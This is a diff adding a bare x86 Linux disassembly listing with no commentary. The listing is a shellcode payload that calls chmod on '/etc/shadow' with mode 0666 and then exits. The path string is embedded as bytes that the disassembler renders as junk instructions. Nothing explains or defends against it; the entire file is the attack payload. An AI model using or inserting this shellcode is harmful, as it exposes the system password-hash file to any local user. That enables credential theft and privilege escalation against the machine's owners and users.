@@ -1,0 +1,20 @@
+cdq
+push   0xf
+pop    eax
+push   edx
+call   0x56557036 <code+22>
+das
+gs je  0x56557091
+das
+jae    0x56557099
+popa
+outs   dx,DWORD PTR fs:[esi]
+ja     0x56557036 <code+22>
+pop    ebx
+push   0x1b6
+pop    ecx
+int    0x80
+push   0x1
+pop    eax
+int    0x80
+add    BYTE PTR [eax],al
